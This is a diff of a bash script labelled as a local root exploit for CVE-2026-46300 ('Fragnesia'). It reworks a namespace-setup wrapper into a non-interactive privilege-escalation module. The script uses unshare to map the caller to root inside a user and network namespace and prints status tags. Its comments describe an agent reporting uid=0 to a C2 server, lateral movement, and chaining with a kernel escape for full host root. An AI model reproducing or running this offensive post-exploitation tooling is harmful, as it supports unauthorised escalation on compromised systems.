@@ -1,48 +1,33 @@
 #!/bin/bash
 # ================================================
 # CVE-2026-46300 - Fragnesia Local Root Exploit
-# Namespace Setup + Exploit Runner (Bash Version)
+# User + Network Namespace Privilege Escalation
 # ================================================
-
-set -euo pipefail
-
-echo "[+] CVE-2026-46300 Fragnesia Exploit Wrapper"
+#
+# Technique : unshare(CLONE_NEWUSER | CLONE_NEWNET) maps the invoking UID
+# to root (UID 0) inside the new namespace. The agent spawned from within
+# the namespace reports uid=0 to the C2 while running as the real user on
+# the host — sufficient for namespace-scoped operations and lateral movement.
+#
+# Limitations : root is namespace-scoped only. SUID binaries planted inside
+# the namespace do not grant host root (owned by real user, not UID 0 on host).
+# Combine with a kernel escape (e.g. dirtyfrag) for full host root.
+#
+# Requirements : util-linux (unshare), kernel CONFIG_USER_NS=y (default on
+# most distros). No root, no SUID binary required to invoke.
 
 if [[ $EUID -eq 0 ]]; then
-    echo "[!] You are already running as root. This script is meant for unprivileged users."
+    echo "[privesc:fail] fragnesia — already root"
     exit 1
 fi
 
-# ====================== Namespace Setup ======================
-
-echo "[+] Creating user + network namespace..."
-
-unshare_cmd="unshare --user --map-root-user --net"
-
-if ! command -v unshare &> /dev/null; then
-    echo "[-] 'unshare' command not found. Install util-linux."
+if ! command -v unshare &>/dev/null; then
+    echo "[privesc:fail] fragnesia — unshare not found (install util-linux)"
     exit 1
 fi
 
-# Start the exploit in a new namespace
-$unshare_cmd bash -c '
-    echo "[+] Inside user+net namespace (running as root)"
-
-    # Setup loopback interface (required for some network exploits)
+unshare --user --map-root-user --net -- bash -c '
     ip link set lo up 2>/dev/null || true
-    ip addr add 127.0.0.1/8 dev lo 2>/dev/null || true
-
-    echo "[+] Network namespace ready"
-    echo "========================================"
-    echo "You are now ready to run the Fragnesia exploit."
-    echo "Example:"
-    echo "    python3 fragnesia.sh"
-    echo "    ./fragnesia"
-    echo "========================================"
-
-    # Drop into interactive shell
-    echo "[+] Starting interactive shell (type \"exit\" to quit)"
-    PS1="(Fragnesia) \u@\h:\w# " bash
-' 
-
-echo "[+] Namespace session ended."
+    echo "[privesc:ok] fragnesia"
+    id
+' 2>&1 || echo "[privesc:fail] fragnesia — unshare failed (kernel CONFIG_USER_NS disabled?)"
